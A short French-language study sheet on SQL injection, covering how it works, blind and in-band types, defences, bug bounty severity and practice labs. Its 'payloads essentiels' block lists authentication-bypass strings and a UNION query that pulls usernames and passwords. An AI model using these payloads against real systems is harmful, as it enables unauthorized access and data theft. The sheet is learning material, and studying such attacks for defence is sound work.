# 🌐 SQL Injection (SQLi)

## C'est quoi le SQLi ?

L'injection SQL consiste à injecter du code SQL
malveillant dans un champ pour manipuler
la base de données du site.

## Comment ça marche ?

Le site fait normalement cette requête :
```sql
SELECT * FROM users WHERE username='claude' AND password='1234'
```

Si on injecte `claude'--` comme username :
```sql
SELECT * FROM users WHERE username='claude'--' AND password='1234'
```

Le `--` commente tout ce qui suit →
le mot de passe est ignoré ! 😏

## Les types de SQLi

### 1. In-Band SQLi
Résultat visible directement dans la page :
```
Error-based  → erreurs SQL révèlent des infos
UNION-based  → extraire des données via UNION
```

### 2. Blind SQLi
Pas de résultat visible — on devine :
```
Boolean-based → réponse différente selon vrai/faux
Time-based    → délai si condition vraie
```

## Payloads essentiels

```sql
# Contourner l'authentification
' OR 1=1--
' OR '1'='1
admin'--

# Commenter le reste
'--
'#

# UNION based
' UNION SELECT username,password,database() FROM users--
```

## Le symbole `--`

```sql
-- → commentaire en SQL
Tout ce qui suit est ignoré par le serveur !
```

## UNION SQLi

UNION permet de combiner deux requêtes :
```sql
SELECT username FROM users
UNION
SELECT password FROM users
→ retourne usernames ET passwords !
```

## Ce qu'on peut faire avec SQLi

```
Contourner l'authentification
Extraire toute la base de données
Lire des fichiers sur le serveur
Écrire des fichiers sur le serveur
Dans certains cas → RCE !
```

## Protection contre SQLi

```
Requêtes préparées (prepared statements)
Validation des inputs
Principe du moindre privilège sur la DB
WAF (Web Application Firewall)
```

## Sévérité en bug bounty

```
SQLi authentification → Critical 🔴🔴
SQLi extraction données → Critical 🔴🔴
Blind SQLi → High 🔴
```

## Pratique

```
Mutillidae → OWASP Top 10 → A1 Injection → SQLi
PortSwigger → Web Security Academy → SQL Injection
```
```

---
